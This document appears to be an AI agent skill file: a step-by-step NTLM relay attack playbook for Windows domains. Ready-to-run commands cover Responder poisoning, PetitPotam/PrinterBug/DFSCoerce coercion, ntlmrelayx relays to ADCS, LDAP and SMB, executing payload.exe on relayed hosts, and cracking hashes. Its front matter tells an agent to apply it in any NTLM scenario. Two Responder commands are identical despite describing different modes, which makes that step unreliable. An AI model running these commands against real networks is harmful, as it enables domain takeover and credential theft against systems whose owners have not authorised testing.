---
name: ntlm-relay-attack
description: "NTLM relay attack methodology. Use when the target network uses NTLM authentication, when you can trigger SMB/HTTP authentication requests, or when you obtain NetNTLM hashes. Covers Responder poisoning, ntlmrelayx relay, printer bug forced authentication, RBCD relay, Shadow Credentials, and ADCS relay. Should be used for any scenario involving NTLM, relay, Responder, or relay attacks"
zh-signals: "实施 NTLM 中继攻击，覆盖 Responder 毒化、ntlmrelayx 中继、强制认证、RBCD、Shadow Credentials 与 ADCS 中继。信号:NTLM中继,Responder,ntlmrelayx,RBCD,ADCS"
when-to-use: >-
  Use when a target network uses NTLM authentication, you can trigger SMB/HTTP
  authentication requests, or you have obtained NetNTLM hashes to relay.
metadata:
  tags: "ntlm,relay,responder,relaying,ntlmrelayx,coerce,petitpotam,printerbug,shadow credentials,rbcd,adcs"
  category: "lateral"
---

# NTLM Relay Attack Methodology

NTLM relay is one of the most powerful lateral movement techniques in domain penetration — no password cracking required, simply forwarding authentication requests to other servers to gain access.

## ⛔ Further Reading (Must Read)

- Detailed relay attack configuration and various relay targets → [references/relay-techniques.md](references/relay-techniques.md)
- Coercion methods (PetitPotam/PrinterBug/DFSCoerce/file poisoning, etc.) → [references/coercion-methods.md](references/coercion-methods.md)
- Responder configuration and poisoning mechanisms (LLMNR/WPAD/mitm6) → [references/responder-config.md](references/responder-config.md)
- SOCKS proxy lateral movement (ntlmrelayx SOCKS + proxychains) → [references/socks-pivoting.md](references/socks-pivoting.md)

---

## Core Concepts

The three elements of an NTLM relay:
1. **Trigger**: makes the target machine/user initiate an NTLM authentication to the attacker
2. **Relay**: forwards the received authentication request to the target service
3. **Target**: the server that accepts the relayed authentication

**Prerequisites**: the target service has not enabled SMB Signing or EPA (Extended Protection for Authentication).

## Phase 1: Environment Reconnaissance

### 1.1 Check SMB signing
```bash
# SMB signing not enforced = relayable
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# Outputs hosts without signing:True

# Or use nmap
nmap -p 445 --script smb2-security-mode 10.0.0.0/24
# "Message signing enabled but not required" = relayable
```

### 1.2 Check ADCS Web Enrollment
```bash
# The ADCS HTTP endpoint usually has no EPA → relayable
netexec ldap DC_IP -u USER -p PASS -M adcs
# Lists CA servers and templates

# Or access it directly
curl -sk https://CA_SERVER/certsrv/
```

## Phase 2: Attack Decision Tree

```
What conditions do you have?
├─ On the internal network with a network interface → Responder poisoning (passive hash collection / active relay)
├─ Have domain credentials → coercion (PetitPotam/PrinterBug) → relay
├─ Target has ADCS Web Enrollment → relay to ADCS to obtain a certificate → domain controller
├─ Target has SMB signing disabled → relay to SMB/LDAP
│   ├─ Relay to LDAP → RBCD / Shadow Credentials
│   └─ Relay to SMB → command execution
└─ Got a NetNTLM hash but cannot relay → crack it offline with hashcat
Detailed commands → [references/relay-techniques.md](references/relay-techniques.md)
```

## Phase 3: Responder Poisoning

```bash
# Start Responder (disable SMB/HTTP so ntlmrelayx can take over)
responder -I eth0 -dwPv

# Or capture hashes only, without relaying
responder -I eth0 -dwPv
# Captured NetNTLMv2 hash → crack with hashcat -m 5600
```

## Phase 4: Coercion

```bash
# PetitPotam (most common, abuses EfsRpcOpenFileRaw)
python3 PetitPotam.py ATTACKER_IP DC_IP
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# PrinterBug (MS-RPRN)
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
# or
python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP

# DFSCoerce
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
```

## Phase 5: Relay to Different Targets

### Relay to ADCS (obtain a domain controller certificate → Domain Admin)
```bash
# Strongest path: PetitPotam + ADCS = domain controller
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Trigger authentication
python3 PetitPotam.py ATTACKER_IP DC_IP

# Once the certificate is obtained → request a TGT
certipy auth -pfx dc.pfx -dc-ip DC_IP
# Obtain the domain controller NTLM hash → DCSync
```

### Relay to LDAP (RBCD / Shadow Credentials)
```bash
# Shadow Credentials (recommended, no computer account creation required)
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target DC_HOSTNAME$

# RBCD
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user MACHINE$
```

### Relay to SMB
```bash
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf relay_targets.txt -smb2support -e payload.exe
```

→ Full relay technique details → [references/relay-techniques.md](references/relay-techniques.md)

## Tool Quick Reference
| Tool | Purpose |
|------|------|
| Responder | LLMNR/NBT-NS/mDNS poisoning |
| ntlmrelayx.py | Core NTLM relay |
| PetitPotam | EFS forced authentication |
| printerbug.py | Printer forced authentication |
| certipy | ADCS certificate attacks |
| hashcat -m 5600 | NetNTLMv2 cracking |
